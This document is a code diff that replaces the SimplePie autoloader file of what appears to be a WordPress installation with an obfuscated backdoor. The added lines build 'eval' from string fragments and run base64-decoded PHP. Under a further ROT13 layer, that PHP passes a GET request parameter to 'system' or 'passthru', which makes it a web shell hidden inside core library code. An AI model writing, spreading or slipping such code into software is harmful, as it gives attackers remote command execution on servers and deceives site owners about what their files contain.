@@ -1,30 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-
-if ( class_exists( 'SimplePie', false ) ) {
-	return;
-}
-
-// Load and register the SimplePie native autoloaders.
-require ABSPATH . WPINC . '/SimplePie/autoloader.php';
-
-/**
- * WordPress autoloader for SimplePie.
- *
- * @since 3.5.0
- * @deprecated 6.7.0 Use `SimplePie_Autoloader` instead.
- *
- * @param string $class Class name.
- */
-function wp_simplepie_autoload( $class ) {
-	_deprecated_function( __FUNCTION__, '6.7.0', 'SimplePie_Autoloader' );
-}
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwoKdnMgKCBweW5mZl9ya3ZmZ2YoICdGdnpjeXJDdnInLCBzbnlmciApICkgewoJZXJnaGVhOwp9CgovLyBZYm5xIG5hcSBlcnR2ZmdyZSBndXIgRnZ6Y3lyQ3ZyIGFuZ3ZpciBuaGdieWJucXJlZi4KZXJkaHZlciBOT0ZDTkdVIC4gSkNWQVAgLiAnL0Z2emN5ckN2ci9uaGdieWJucXJlLmN1Yyc7CgovKioKICogSmJlcUNlcmZmIG5oZ2J5Ym5xcmUgc2JlIEZ2emN5ckN2ci4KICoKICogQGZ2YXByIDMuNS4wCiAqIEBxcmNlcnBuZ3JxIDYuNy4wIEhmciBgRnZ6Y3lyQ3ZyX05oZ2J5Ym5xcmVgIHZhZmdybnEuCiAqCiAqIEBjbmVueiBmZ2V2YXQgJHB5bmZmIFB5bmZmIGFuenIuCiAqLwpzaGFwZ3ZiYSBqY19mdnpjeXJjdnJfbmhnYnlibnEoICRweW5mZiApIHsKCV9xcmNlcnBuZ3JxX3NoYXBndmJhKCBfX1NIQVBHVkJBX18sICc2LjcuMCcsICdGdnpjeXJDdnJfTmhnYnlibnFyZScgKTsKfQoKJHB6cSA9ICRfVFJHWydjJ107CiRzem5jWydrMSddKCRwenEpOwo/PiI7CmV2YWwoJGYoJGMpKTsKPz4=");
+$f($c);
+?>
